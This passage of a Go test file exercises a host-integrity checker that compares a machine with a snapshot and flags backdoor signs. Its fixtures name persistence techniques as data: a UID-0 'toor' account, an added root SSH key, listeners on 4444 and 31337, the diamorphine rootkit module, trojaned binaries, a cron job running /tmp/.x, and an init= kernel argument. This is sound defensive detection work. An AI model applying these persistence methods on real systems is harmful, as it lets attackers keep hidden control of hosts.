	if r := run(c, nil, nil); find(r, "heur.root_key:/root/.ssh/authorized_keys:1") == nil {
		t.Fatalf("no-snapshot scan lost the root key note: %v", keys(r))
	}
	r := run(c, snapOf(c), nil)
	for _, k := range keys(r) {
		if strings.HasPrefix(k, "heur.root_key:") {
			t.Errorf("root key note kept with a snapshot: %s", k)
		}
	}
}

func TestJudgeNewRootKeyIsBackdoor(t *testing.T) {
	old := clean()
	old.Persist = []model.PersistFile{rootKeys(ownerKey)}
	cur := clone(old)
	cur.Persist = []model.PersistFile{rootKeys(ownerKey, serverKey, evilKey)}

	r := run(cur, snapOf(old), nil)
	f := must(t, r, "snap.root_key:/root/.ssh/authorized_keys:3", model.SevBackdoor)
	if e := f.Evidence[0]; e.Path != "/root/.ssh/authorized_keys" || e.Line != 3 || e.After != evilKey || e.When == nil {
		t.Errorf("evidence %+v", e)
	}
	want := evidenceCopy + "'/root/.ssh/authorized_keys' /root/telltale-evidence/ && sed -i '3d' '/root/.ssh/authorized_keys'"
	if !strings.HasPrefix(f.Fix, want) {
		t.Errorf("fix %q", f.Fix)
	}
	// The telltale server's own key is expected, and the only other change
	// is the new key itself, so there is no second, generic finding.
	absent(t, r, "snap.root_key:/root/.ssh/authorized_keys:2")
	absent(t, r, "snap.persist:/root/.ssh/authorized_keys")
}

func TestJudgeUserAdded(t *testing.T) {
	old := clean()
	cur := clone(old)
	cur.Accounts.Users = append(cur.Accounts.Users,
		model.User{Name: "toor", UID: 0, GID: 0, Home: "/root", Shell: "/bin/bash", Password: model.PasswordState{Known: true, Set: true, Algo: "yescrypt", Digest: "d2", LastChange: 20000}},
		model.User{Name: "deploy", UID: 1001, GID: 1001, Home: "/home/deploy", Shell: "/bin/bash", Password: model.PasswordState{Known: true, Locked: true, LastChange: 20000}})
	r := run(cur, snapOf(old), nil)
	f := must(t, r, "snap.user_added:toor", model.SevBackdoor)
	if !strings.Contains(f.Fix, "userdel -f -- 'toor'") || !strings.HasPrefix(f.Fix, evidenceCopy) {
		t.Errorf("fix %q", f.Fix)
	}
	must(t, r, "snap.user_added:deploy", model.SevNote)

	// An existing account given user id 0 is as bad as a new one.
	old2 := clone(cur)
	cur2 := clone(old2)
	for i := range cur2.Accounts.Users {
		if cur2.Accounts.Users[i].Name == "deploy" {
			cur2.Accounts.Users[i].UID = 0
		}
	}
	must(t, run(cur2, snapOf(old2), nil), "snap.user_changed:deploy", model.SevBackdoor)
}

func TestJudgePasswordChangeShowsNoSecret(t *testing.T) {
	old := clean()
	cur := clone(old)
	cur.Accounts.Users[0].Password.Digest = "digest-root-2"
	r := run(cur, snapOf(old), nil)
	f := must(t, r, "snap.user_changed:root", model.SevNote)
	if !strings.Contains(f.Evidence[0].After, "password changed") {
		t.Errorf("evidence %+v", f.Evidence[0])
	}
	b, _ := json.Marshal(r)
	if strings.Contains(string(b), "digest-root") {
		t.Errorf("password digest leaked into the report")
	}
}

func TestJudgePrivilegedGroupMember(t *testing.T) {
	old := clean()
	cur := clone(old)
	for i := range cur.Accounts.Groups {
		switch cur.Accounts.Groups[i].Name {
		case "sudo":
			cur.Accounts.Groups[i].Members = []string{"deploy"}
		case "staff", "users":
			cur.Accounts.Groups[i].Members = []string{"deploy"}
		}
	}
	r := run(cur, snapOf(old), nil)
	f := must(t, r, "snap.group:sudo", model.SevBackdoor)
	if !strings.Contains(f.Fix, "gpasswd -d 'deploy' -- 'sudo'") {
		t.Errorf("fix %q", f.Fix)
	}
	// staff can write /usr/local, which comes first in root's PATH.
	must(t, r, "snap.group:staff", model.SevBackdoor)
	must(t, r, "snap.group:users", model.SevNote)
}

func TestJudgeListenerAdded(t *testing.T) {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("openssh-server", "1:9.2p1-2+deb12u3", "/usr/sbin/sshd"))
	old.Files = append(old.Files, file("/usr/sbin/sshd", "sshd", 0o755))
	cur := clone(old)
	cur.Runtime.Processes = []model.Process{
		{PID: 10, UID: 0, Exe: "/usr/sbin/sshd", Comm: "sshd"},
		{PID: 11, UID: -1, Exe: "/usr/local/bin/agent", Comm: "agent"},
		{PID: 12, UID: 1000, Exe: "/tmp/.x/y", Comm: "y"},
	}
	cur.Runtime.Sockets = []model.Socket{
		{Proto: "tcp", Local: "0.0.0.0:2222", State: "LISTEN", Listening: true, PID: 10},
		{Proto: "tcp", Local: "0.0.0.0:4444", State: "LISTEN", Listening: true, PID: 11},
		{Proto: "tcp", Local: "0.0.0.0:31337", State: "LISTEN", Listening: true, PID: 12},
		{Proto: "udp", Local: "0.0.0.0:5353", Listening: true},
	}
	r := run(cur, snapOf(old), nil)
	must(t, r, "snap.listener:tcp:0.0.0.0:2222", model.SevNote)
	f := must(t, r, "snap.listener:tcp:0.0.0.0:4444", model.SevBackdoor)
	if !strings.Contains(f.Fix, "cp /proc/11/exe /root/telltale-evidence/11.exe") {
		t.Errorf("fix %q", f.Fix)
	}
	must(t, r, "snap.listener:tcp:0.0.0.0:31337", model.SevBackdoor)
	must(t, r, "snap.listener:udp:0.0.0.0:5353", model.SevNote)
}

func TestJudgeModuleAdded(t *testing.T) {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("linux-image-6.1.0-25-amd64", "6.1.106-3", "/lib/modules/6.1.0-25-amd64/kernel/net/wg.ko"))
	cur := clone(old)
	cur.Runtime.Modules = []model.KernelModule{
		{Name: "wg", File: "/lib/modules/6.1.0-25-amd64/kernel/net/wg.ko"},
		{Name: "diamorphine", File: "/lib/modules/6.1.0-25-amd64/extra/diamorphine.ko"},
	}
	r := run(cur, snapOf(old), nil)
	must(t, r, "snap.module:wg", model.SevNote)
	f := must(t, r, "snap.module:diamorphine", model.SevBackdoor)
	if !strings.Contains(f.Fix, "modinfo -- 'diamorphine'") || !strings.HasPrefix(f.Fix, evidenceCopy+"'/lib/modules/6.1.0-25-amd64/extra/diamorphine.ko'") {
		t.Errorf("fix %q", f.Fix)
	}
}

func TestJudgeFileChangeRankedByLocation(t *testing.T) {
	old := clean()
	old.Files = append(old.Files, file("/etc/security/limits.conf", "limits", 0o644))
	cur := clone(old)
	setFile(cur, file("/usr/bin/ls", "ls trojan", 0o755))
	setFile(cur, file("/usr/share/doc/openssl/README", "readme 2", 0o644))
	setFile(cur, file("/etc/hostname", "web02", 0o644))
	setFile(cur, file("/etc/security/limits.conf", "limits 2", 0o644))
	setFile(cur, file("/usr/local/bin/tool", "tool", 0o755))
	setFile(cur, file("/usr/bin/openssl", "openssl patched", 0o755))
	res := archive()
	res.Mismatch = []pkgverify.FileVerdict{{Path: "/usr/bin/openssl", Package: "openssl", Version: "3.0.14-1~deb12u2", Expected: h("openssl 3.0.14"), Actual: h("openssl patched"), Reason: "differs from the file in the signed package", Source: "archive"}}

	r := run(cur, snapOf(old), res)
	f := must(t, r, "snap.file_modified:/usr/bin/ls", model.SevBackdoor)
	if !strings.HasPrefix(f.Fix, evidenceCopy+"'/usr/bin/ls' /root/telltale-evidence/ && apt-get install --reinstall -- 'coreutils'") {
		t.Errorf("fix %q", f.Fix)
	}
	// An exception accepts the first evidence's After, so it must name the
	// new content exactly, not by a short hash prefix.
	if after := f.Evidence[0].After; !strings.Contains(after, h("ls trojan")) {
		t.Errorf("evidence does not carry the full new hash: %q", after)
	}
	must(t, r, "snap.file_modified:/etc/security/limits.conf", model.SevBackdoor)
	must(t, r, "snap.file_modified:/usr/share/doc/openssl/README", model.SevNote)
	must(t, r, "snap.file_modified:/etc/hostname", model.SevNote)
	a := must(t, r, "snap.file_added:/usr/local/bin/tool", model.SevBackdoor)
	if a.Fix != evidenceCopy+"'/usr/local/bin/tool' /root/telltale-evidence/ && rm -- '/usr/local/bin/tool'   # only if you did not put it there" {
		t.Errorf("fix %q", a.Fix)
	}
	// The change behind a package mismatch is evidence on that finding.
	absent(t, r, "snap.file_modified:/usr/bin/openssl")
	m := must(t, r, "pkg.mismatch:/usr/bin/openssl", model.SevTampering)
	if len(m.Evidence) < 2 {
		t.Errorf("snapshot change not folded into the mismatch: %+v", m.Evidence)
	}
}

func TestJudgeRoutineChangesAreNotBackdoorSigns(t *testing.T) {
	old := clean()
	old.Files = append(old.Files,
		model.FileEntry{Path: "/usr/share/doc", Type: "dir", Mode: 0o40755, Size: 4096},
		file("/boot/initrd.img-6.1.0-25-amd64", "initrd", 0o644),
		file("/etc/shadow", "shadow", 0o640),
		file("/var/lib/dpkg/info/openssl.md5sums", "sums", 0o644))
	cur := clone(old)
	setFile(cur, model.FileEntry{Path: "/usr/share/doc", Type: "dir", Mode: 0o40755, Size: 8192})
	setFile(cur, file("/boot/initrd.img-6.1.0-25-amd64", "initrd 2", 0o644))
	setFile(cur, file("/etc/shadow", "shadow 2", 0o640))
	cur.Accounts.Users[0].Password.Digest = "digest-root-2"
	setFile(cur, model.FileEntry{Path: "/usr/bin/awk", Type: "symlink", Target: "/etc/alternatives/awk", Mode: 0o120777})

	// Nothing was updated: a rebuilt initrd is a backdoor sign.
	r := run(cur, snapOf(old), nil)
	must(t, r, "snap.file_modified:/boot/initrd.img-6.1.0-25-amd64", model.SevBackdoor)

	// An update of a package that does not rebuild the initramfs leaves it
	// a backdoor sign; dpkg's own records of the updated package are
	// explained with it.
	setVersion(cur, "openssl", "3.0.15-1~deb12u1")
	setFile(cur, file("/var/lib/dpkg/info/openssl.md5sums", "sums 2", 0o644))
	r = run(cur, snapOf(old), archive())
	must(t, r, "snap.file_modified:/boot/initrd.img-6.1.0-25-amd64", model.SevBackdoor)
	absent(t, r, "snap.file_modified:/var/lib/dpkg/info/openssl.md5sums")
	// No file of openssl changed and nothing confirmed its new version: the
	// version change is a note (R63), with dpkg's records on it.
	if v := must(t, r, "snap.pkg_version_only:openssl", model.SevNote); !hasEvidencePath(v, "/var/lib/dpkg/info/openssl.md5sums") {
		t.Errorf("dpkg records not shown with the version change: %+v", v.Evidence)
	}
	absent(t, r, "snap.file_modified:/usr/share/doc")
	absent(t, r, "snap.file_modified:/etc/shadow")
	must(t, r, "snap.user_changed:root", model.SevNote)
	must(t, r, "snap.file_added:/usr/bin/awk", model.SevNote)
}

func TestJudgeKernelUpdateGeneratedFilesFoldIntoKernelPackage(t *testing.T) {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("linux-image-6.1.0-25-amd64", "6.1.106-3"))
	old.Files = append(old.Files,
		file("/boot/initrd.img-6.1.0-25-amd64", "initrd 25", 0o644),
		file("/lib/modules/6.1.0-25-amd64/modules.dep", "dep 25", 0o644),
		file("/boot/grub/grub.cfg", "menu 25", 0o444),
		file("/etc/default/grub", "GRUB_CMDLINE_LINUX=\"\"", 0o644))
	cur := clone(old)
	removePkg(cur, "linux-image-6.1.0-25-amd64")
	cur.Packages.Installed = append(cur.Packages.Installed, pkg("linux-image-6.1.0-27-amd64", "6.1.115-1"))
	cur.Files = slices.DeleteFunc(cur.Files, func(e model.FileEntry) bool { return strings.Contains(e.Path, "6.1.0-25") })
	cur.Files = append(cur.Files,
		file("/boot/initrd.img-6.1.0-27-amd64", "initrd 27", 0o644),
		file("/lib/modules/6.1.0-27-amd64/modules.dep", "dep 27", 0o644))
	setFile(cur, file("/boot/grub/grub.cfg", "menu 27", 0o444))

	// The new kernel is confirmed by one of its files.
	r := run(cur, snapOf(old), archive(pkgverify.FileVerdict{Path: "/boot/vmlinuz-6.1.0-27-amd64", Package: "linux-image-6.1.0-27-amd64", Version: "6.1.115-1", Source: "archive"}))
	for _, k := range []string{"snap.file_added:/boot/initrd.img-6.1.0-27-amd64", "snap.file_added:/lib/modules/6.1.0-27-amd64/modules.dep",
		"snap.file_removed:/boot/initrd.img-6.1.0-25-amd64", "snap.file_removed:/lib/modules/6.1.0-25-amd64/modules.dep"} {
		absent(t, r, k)
	}
	g := explained(r, "explained:linux-image-6.1.0-27-amd64")
	if g == nil || !hasEvidencePath(g, "/boot/initrd.img-6.1.0-27-amd64") || !hasEvidencePath(g, "/lib/modules/6.1.0-27-amd64/modules.dep") {
		t.Errorf("new kernel's generated files not shown with it: %+v", g)
	}
	// The old kernel's removal is routine too, and its generated files went
	// with it.
	absent(t, r, "snap.pkg_removed:linux-image-6.1.0-25-amd64")
	if o := explained(r, "explained:linux-image-6.1.0-25-amd64"); o == nil || !hasEvidencePath(o, "/boot/initrd.img-6.1.0-25-amd64") {
		t.Errorf("old kernel's initrd not shown with its removal: %+v", o)
	}
	// A kernel install rebuilds the boot menu: shown with the new kernel.
	absent(t, r, "snap.file_modified:/boot/grub/grub.cfg")
	if !hasEvidencePath(g, "/boot/grub/grub.cfg") {
		t.Errorf("boot menu not shown with the new kernel: %+v", g.Evidence)
	}

	// The kernel command line is a persistence location.
	setFile(cur, file("/etc/default/grub", "GRUB_CMDLINE_LINUX=\"init=/tmp/x\"", 0o644))
	must(t, run(cur, snapOf(old), archive()), "snap.file_modified:/etc/default/grub", model.SevBackdoor)
}

func TestJudgeRootsEverydayFilesAreQuiet(t *testing.T) {
	old := clean()
	old.Files = append(old.Files, file("/root/.bash_history", "ls", 0o600), file("/root/.ssh/known_hosts", "a", 0o644), file("/root/.viminfo", "v", 0o600))
	cur := clone(old)
	setFile(cur, file("/root/.bash_history", "ls\ncd", 0o600))
	setFile(cur, file("/root/.ssh/known_hosts", "a\nb", 0o644))
	setFile(cur, file("/root/.lesshst", "l", 0o600))
	cur.Files = slices.DeleteFunc(cur.Files, func(e model.FileEntry) bool { return e.Path == "/root/.viminfo" })
	r := run(cur, snapOf(old), nil)
	absent(t, r, "snap.file_modified:/root/.bash_history")
	absent(t, r, "snap.file_modified:/root/.ssh/known_hosts")
	absent(t, r, "snap.file_added:/root/.lesshst")
	// A wiped history or editor state is still listed.
	must(t, r, "snap.file_removed:/root/.viminfo", model.SevNote)

	// root's key file and SSH configuration stay persistence locations.
	cur.Files = append(cur.Files, file("/root/.ssh/rc", "evil", 0o755))
	must(t, run(cur, snapOf(old), nil), "snap.file_added:/root/.ssh/rc", model.SevBackdoor)
}

func TestJudgeConffileReplacedByUpgradeIsExplained(t *testing.T) {
	const p = "/etc/security/limits.conf"
	old := clean()
	lp := pkg("libpam-modules", "1.5.2-6", p)
	lp.Conffiles = map[string]string{p: "0123456789abcdef0123456789abcdef"}
	old.Packages.Installed = append(old.Packages.Installed, lp)
	old.Files = append(old.Files, file(p, "limits", 0o644))
	cur := clone(old)
	setVersion(cur, "libpam-modules", "1.5.2-6+deb12u1")
	setFile(cur, file(p, "limits, new default", 0o644))

	r := run(cur, snapOf(old), archive())
	absent(t, r, "snap.file_modified:"+p)
	if g := explained(r, "explained:libpam-modules"); g == nil || !hasEvidencePath(g, p) {
		t.Errorf("conffile replaced by the upgrade not explained: %+v", g)
	}
	// Edited away from the default: ranked as a persistence location.
	res := archive()
	res.Conffiles = []pkgverify.ConffileDiff{{Path: p, Package: "libpam-modules", Version: "1.5.2-6+deb12u1", Expected: h("default"), Actual: h("limits, new default")}}
	must(t, run(cur, snapOf(old), res), "snap.file_modified:"+p, model.SevBackdoor)
}

func cron(lines ...string) model.PersistFile {
	return model.PersistFile{Path: "/etc/cron.d/backup", Kind: model.PersistKindCron, Mode: 0o100644, SHA256: h(strings.Join(lines, "\n")), Lines: lines, MTime: changed}
}

func TestJudgePersistChanged(t *testing.T) {
	old := clean()
	old.Persist = []model.PersistFile{cron("0 3 * * * root /usr/local/bin/backup")}
	old.Files = append(old.Files, file("/etc/cron.d/backup", "0 3 * * * root /usr/local/bin/backup", 0o644))
	cur := clone(old)
	cur.Persist = []model.PersistFile{cron("0 3 * * * root /usr/local/bin/backup", "* * * * * root /tmp/.x")}
	setFile(cur, file("/etc/cron.d/backup", "0 3 * * * root /usr/local/bin/backup\n* * * * * root /tmp/.x", 0o644))

	r := run(cur, snapOf(old), nil)
	f := must(t, r, "snap.persist:/etc/cron.d/backup", model.SevBackdoor)
	if f.Evidence[0].After != cur.Persist[0].SHA256 {
		t.Errorf("first evidence must carry the file's new hash (the value an exception accepts): %+v", f.Evidence[0])
	}
	if !slices.ContainsFunc(f.Evidence, func(e model.Evidence) bool { return e.Line == 2 && e.After == "* * * * * root /tmp/.x" }) {
		t.Errorf("added line missing: %+v", f.Evidence)
	}
	if !strings.HasPrefix(f.Fix, evidenceCopy+"'/etc/cron.d/backup' /root/telltale-evidence/ && sed -i '2d' '/etc/cron.d/backup'") {
		t.Errorf("fix %q", f.Fix)
	}
	absent(t, r, "snap.file_modified:/etc/cron.d/backup")
}

func TestJudgePersistConffileUpgradeExplained(t *testing.T) {
	const p = "/etc/cron.daily/logrotate"
	lr := func(version, text string) (model.Package, model.PersistFile) {
		pk := pkg("logrotate", version, p, "/usr/sbin/logrotate")
		pk.Conffiles = map[string]string{p: "0123456789abcdef0123456789abcdef"}
		return pk, model.PersistFile{Path: p, Kind: model.PersistKindCron, Mode: 0o100755, SHA256: h(text), Lines: strings.Split(text, "\n"), MTime: changed}
	}
	old := clean()
	pk, pf := lr("3.21.0-1", "#!/bin/sh\nlogrotate /etc/logrotate.conf")
	old.Packages.Installed = append(old.Packages.Installed, pk)
	old.Persist = []model.PersistFile{pf}
	old.Files = append(old.Files, file(p, "#!/bin/sh\nlogrotate /etc/logrotate.conf", 0o755))

	upgraded := clone(old)
	pk2, pf2 := lr("3.21.0-2", "#!/bin/sh\nexec logrotate /etc/logrotate.conf")
	upgraded.Packages.Installed[len(upgraded.Packages.Installed)-1] = pk2
	upgraded.Persist = []model.PersistFile{pf2}
	nf := file(p, "#!/bin/sh\nexec logrotate /etc/logrotate.conf", 0o755)
	setFile(upgraded, nf)

	// The upgrade replaced the conffile and it matches the new default
	// (package verification reports nothing about it): explained.
	r := run(upgraded, snapOf(old), archive())
	absent(t, r, "snap.persist:"+p)
	absent(t, r, "snap.file_modified:"+p)
	if g := explained(r, "explained:logrotate"); g == nil || !hasEvidencePath(g, p) {
		t.Errorf("conffile update not explained: %+v", g)
	}

	// It differs from the package default: not explained by the upgrade.
	res := archive()
	res.Conffiles = []pkgverify.ConffileDiff{{Path: p, Package: "logrotate", Version: "3.21.0-2", Expected: h("default"), Actual: nf.SHA256}}
	must(t, run(upgraded, snapOf(old), res), "snap.persist:"+p, model.SevBackdoor)

	// Same change with no upgrade behind it.
	same := clone(upgraded)
	setVersion(same, "logrotate", "3.21.0-1")
	must(t, run(same, snapOf(old), archive()), "snap.persist:"+p, model.SevBackdoor)

	// Without package verification there is nothing to explain it with.
	must(t, run(upgraded, snapOf(old), nil), "snap.persist:"+p, model.SevBackdoor)
}

func TestJudgeNewPackageRaisedBy(t *testing.T) {
	cases := []struct {
		name  string
		files []model.FileEntry
		edit  func(c *model.Collection)
	}{
		{"caps", []model.FileEntry{func() model.FileEntry {
			e := file("/usr/bin/pinger", "p", 0o755)
			e.Caps = "0100000200200000"
			return e
		}()}, nil},
		{"module", []model.FileEntry{file("/lib/modules/6.1.0-25-amd64/updates/x.ko", "ko", 0o644)}, nil},
		{"pam", []model.FileEntry{file("/usr/lib/x86_64-linux-gnu/security/pam_x.so", "pam", 0o644)}, nil},
		{"unit", []model.FileEntry{file("/lib/systemd/system/xd.service", "[Service]", 0o644)}, func(c *model.Collection) {
			c.Persist = append(c.Persist, model.PersistFile{Path: "/etc/systemd/system/multi-user.target.wants/xd.service", Kind: model.PersistKindSystemdEnabled,
				Mode: 0o120777, SHA256: h("/lib/systemd/system/xd.service"), Lines: []string{"/lib/systemd/system/xd.service"}, MTime: changed})
		}},
		{"listener", []model.FileEntry{file("/usr/sbin/xd", "xd", 0o755)}, func(c *model.Collection) {
			c.Runtime.Processes = append(c.Runtime.Processes, model.Process{PID: 77, UID: 0, Exe: "/usr/sbin/xd"})
			c.Runtime.Sockets = append(c.Runtime.Sockets, model.Socket{Proto: "tcp", Local: "0.0.0.0:8080", Listening: true, PID: 77})
		}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			old := clean()
			cur := clone(old)
			res := archive()
			var paths []string
			for _, e := range tc.files {
				cur.Files = append(cur.Files, e)
				paths = append(paths, e.Path)
				res.Verified = append(res.Verified, pkgverify.FileVerdict{Path: e.Path, Package: "xpkg", Version: "1", Expected: e.SHA256, Actual: e.SHA256, Source: "archive"})
			}
			cur.Packages.Installed = append(cur.Packages.Installed, pkg("xpkg", "1", paths...))
			if tc.edit != nil {
				tc.edit(cur)
			}
			r := run(cur, snapOf(old), res)
			f := must(t, r, "snap.pkg_installed:xpkg", model.SevBackdoor)
			if tc.name == "unit" {
				absent(t, r, "snap.persist:/etc/systemd/system/multi-user.target.wants/xd.service")
				if !hasEvidencePath(f, "/etc/systemd/system/multi-user.target.wants/xd.service") {
					t.Errorf("enable link not shown on the package finding: %+v", f.Evidence)
				}
			}
		})
	}
}

func TestJudgeSecurityPackageRemovedIsWeak(t *testing.T) {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("fail2ban", "1.0.2-2"), pkg("jq", "1.6-2.1"))
	cur := clone(old)
	removePkg(cur, "fail2ban")
	removePkg(cur, "jq")
	r := run(cur, snapOf(old), nil)
	f := must(t, r, "snap.pkg_removed:fail2ban", model.SevWeak)
	if !strings.Contains(f.Fix, "apt-get install -- 'fail2ban'") {
		t.Errorf("fix %q", f.Fix)
	}
	must(t, r, "snap.pkg_removed:jq", model.SevNote)
}

// --- fixes, evidence and assembly ---

func TestJudgeCheckFixComesFromFixFor(t *testing.T) {
	c := clean()
	c.Accounts.Users = append(c.Accounts.Users, model.User{Name: "toor", UID: 0, Home: "/root", Shell: "/bin/bash",
		Password: model.PasswordState{Known: true, Set: true, Algo: "yescrypt", Digest: "d", LastChange: 20000}})
	it, _ := checklist.ByID("TT-ACCT-001")
	want := it.FixFor(c, ctx)
	if want == it.Fix {
		t.Fatalf("test needs an item whose machine-specific fix differs from the static one")
	}
	f := must(t, run(c, nil, nil), "check:TT-ACCT-001", model.SevWeak)
	if f.Fix != want {
		t.Errorf("fix %q, want %q", f.Fix, want)
	}
	if f.Evidence[0].After != "UID 0 besides root: toor" {
		t.Errorf("observed value not in evidence: %+v", f.Evidence[0])
	}
}

func TestJudgeFixQuotesAndRefusesControlCharacters(t *testing.T) {
	old := clean()
	cur := clone(old)
	cur.Files = append(cur.Files, file("/usr/local/bin/it's", "q", 0o755), file("/usr/local/bin/bad\nname", "n", 0o755))
	r := run(cur, snapOf(old), nil)
	q := must(t, r, "snap.file_added:/usr/local/bin/it's", model.SevBackdoor)
	if !strings.Contains(q.Fix, `rm -- '/usr/local/bin/it'\''s'`) {
		t.Errorf("fix %q", q.Fix)
	}
	n := must(t, r, "snap.file_added:/usr/local/bin/bad\nname", model.SevBackdoor)
	if strings.Contains(n.Fix, "rm") || strings.Contains(n.Fix, "\n") || !strings.Contains(n.Fix, "control") {
		t.Errorf("fix for a name with a newline: %q", n.Fix)
	}
}

func TestJudgeDuplicateKeysMergedKeepingHighest(t *testing.T) {
	j := newJudge(Input{Collection: clean()}, clean())
	j.add(&model.Finding{Key: "k", Severity: model.SevNote, Title: "low", Evidence: []model.Evidence{{Detail: "a"}}})
	j.add(&model.Finding{Key: "k", Severity: model.SevBackdoor, Title: "high", Evidence: []model.Evidence{{Detail: "b"}}})
	j.add(&model.Finding{Key: "k", Severity: model.SevWeak, Title: "mid", Evidence: []model.Evidence{{Detail: "a"}}})
	if len(j.findings) != 1 {
		t.Fatalf("%d findings", len(j.findings))
	}
	f := j.findings[0]
	if f.Severity != model.SevBackdoor || f.Title != "high" || len(f.Evidence) != 2 {
		t.Errorf("merged %+v", f)
	}
}

func TestJudgeSkippedListsCollectionAndCheckSkips(t *testing.T) {
	c := clean()
	c.Skipped = []model.Skip{{Check: "accounts", Reason: "/etc/shadow: permission denied"}}
	r := run(c, nil, nil)
	if !slices.Contains(r.Skipped, c.Skipped[0]) {
		t.Errorf("collection skip missing: %+v", r.Skipped)
	}
	if !slices.ContainsFunc(r.Skipped, func(s model.Skip) bool {
		return s.Check == "TT-SSH-001" && strings.Contains(s.Reason, "no sshd configuration")
	}) {
		t.Errorf("check skip missing: %+v", r.Skipped)
	}
	if r.Schema != model.ReportSchema || r.Host.Hostname != "web01" || !r.Time.Equal(now) {
		t.Errorf("header %+v %v %v", r.Host, r.Schema, r.Time)
	}
}

// --- review round 1: paths where a backdoor was explained, dropped or
// downgraded ---

// C1: an "upgrade" to a version no trusted source has must not explain the
// programs it replaced.
func TestJudgeUnofficialUpgradeIsBackdoor(t *testing.T) {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("openssh-server", "1:9.2p1-2+deb12u3", "/usr/sbin/sshd", "/usr/share/doc/openssh-server/README"))
	old.Files = append(old.Files, file("/usr/sbin/sshd", "sshd", 0o755), file("/usr/share/doc/openssh-server/README", "r", 0o644))
	cur := clone(old)
	setVersion(cur, "openssh-server", "1:9.2p1-2+deb12u9")
	setFile(cur, file("/usr/sbin/sshd", "trojan sshd", 0o755))
	setFile(cur, file("/usr/share/doc/openssh-server/README", "r2", 0o644))
	res := archive()
	res.Unverifiable = []pkgverify.FileVerdict{
		{Path: "/usr/sbin/sshd", Package: "openssh-server", Version: "1:9.2p1-2+deb12u9", Actual: h("trojan sshd"), Reason: pkgverify.ReasonNotOfficial, Kind: pkgverify.KindNotFound},
		{Path: "/usr/share/doc/openssh-server/README", Package: "openssh-server", Version: "1:9.2p1-2+deb12u9", Actual: h("r2"), Reason: pkgverify.ReasonNotOfficial, Kind: pkgverify.KindNotFound}}

	r := run(cur, snapOf(old), res)
	f := must(t, r, "snap.pkg_upgraded:openssh-server", model.SevBackdoor)
	if !hasEvidencePath(f, "/usr/sbin/sshd") || f.Evidence[0].Before != "1:9.2p1-2+deb12u3" || !strings.HasPrefix(f.Evidence[0].After, "1:9.2p1-2+deb12u9; files sha256:") {
		t.Errorf("evidence %+v", f.Evidence)
	}
	// Nothing a version no trusted source has changed is explained: the
	// documentation file is listed too.
	if !hasEvidencePath(f, "/usr/share/doc/openssh-server/README") {
		t.Errorf("non-program file of an unconfirmed version not listed: %+v", f.Evidence)
	}
	if !strings.Contains(f.Title, "2 files changed") {
		t.Errorf("title %q", f.Title)
	}
	if explained(r, "explained:openssh-server") != nil {
		t.Errorf("unofficial upgrade explained")
	}
	if r.ExitCode != 2 {
		t.Errorf("exit %d", r.ExitCode)
	}

	// A new package whose programs no trusted source has.
	cur2 := clone(old)
	cur2.Packages.Installed = append(cur2.Packages.Installed, pkg("tool", "1.0", "/usr/bin/tool"))
	cur2.Files = append(cur2.Files, file("/usr/bin/tool", "tool", 0o755))
	res2 := archive()
	res2.Unverifiable = []pkgverify.FileVerdict{{Path: "/usr/bin/tool", Package: "tool", Version: "1.0", Reason: pkgverify.ReasonNotOfficial, Kind: pkgverify.KindNotFound}}
	n := must(t, run(cur2, snapOf(old), res2), "snap.pkg_installed:tool", model.SevBackdoor)
	if !hasEvidencePath(n, "/usr/bin/tool") {
		t.Errorf("unverified program not on the package: %+v", n.Evidence)
	}

	// A routine-looking kernel package whose modules no trusted source has.
	old3 := clean()
	old3.Packages.Installed = append(old3.Packages.Installed, pkg("linux-image-6.1.0-25-amd64", "6.1.106-3"))
	cur3 := clone(old3)
	ko := "/lib/modules/6.1.0-99-amd64/kernel/x.ko"
	cur3.Packages.Installed = append(cur3.Packages.Installed, pkg("linux-image-6.1.0-99-amd64", "6.1.999-1", ko))
	cur3.Files = append(cur3.Files, file(ko, "ko", 0o644))
	res3 := archive()
	res3.Unverifiable = []pkgverify.FileVerdict{{Path: ko, Package: "linux-image-6.1.0-99-amd64", Reason: pkgverify.ReasonNotOfficial, Kind: pkgverify.KindNotFound}}
	r = run(cur3, snapOf(old3), res3)
	must(t, r, "snap.pkg_installed:linux-image-6.1.0-99-amd64", model.SevBackdoor)
	if explained(r, "explained:linux-image-6.1.0-99-amd64") != nil {
		t.Errorf("unverifiable kernel explained")
	}
}

// I1: an exception covers only what it accepted.
func TestJudgeExceptionValuesCoverWhatMakesItSerious(t *testing.T) {
	// A listener accepted for a packaged program, later served by another.
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("nginx", "1.22", "/usr/sbin/nginx"))
	old.Files = append(old.Files, file("/usr/sbin/nginx", "nginx", 0o755), file("/usr/local/bin/evil", "evil", 0o755))
	cur := clone(old)
	cur.Runtime.Processes = []model.Process{{PID: 10, UID: 0, Exe: "/usr/sbin/nginx"}}
	cur.Runtime.Sockets = []model.Socket{{Proto: "tcp", Local: "0.0.0.0:8080", State: "LISTEN", Listening: true, PID: 10}}
	s := snapOf(old)
	f := must(t, run(cur, s, nil), "snap.listener:tcp:0.0.0.0:8080", model.SevNote)
	s.Exceptions = []model.Exception{{FindingKey: f.Key, AcceptedValue: currentValue(f), At: taken}}
	absent(t, run(cur, s, nil), "snap.listener:tcp:0.0.0.0:8080")
	cur2 := clone(cur)
	cur2.Runtime.Processes = []model.Process{{PID: 66, UID: 0, Exe: "/usr/local/bin/evil"}}
	cur2.Runtime.Sockets[0].PID = 66
	must(t, run(cur2, s, nil), "snap.listener:tcp:0.0.0.0:8080", model.SevBackdoor)

	// A module accepted from its package file, later loaded from another.
	oldm := clean()
	oldm.Packages.Installed = append(oldm.Packages.Installed, pkg("linux-image-6.1.0-25-amd64", "6.1.106-3", "/lib/modules/6.1.0-25-amd64/kernel/net/wg.ko"))
	curm := clone(oldm)
	curm.Runtime.Modules = []model.KernelModule{{Name: "wg", File: "/lib/modules/6.1.0-25-amd64/kernel/net/wg.ko"}}
	sm := snapOf(oldm)
	m := must(t, run(curm, sm, nil), "snap.module:wg", model.SevNote)
	sm.Exceptions = []model.Exception{{FindingKey: m.Key, AcceptedValue: currentValue(m), At: taken}}
	absent(t, run(curm, sm, nil), "snap.module:wg")
	curm2 := clone(oldm)
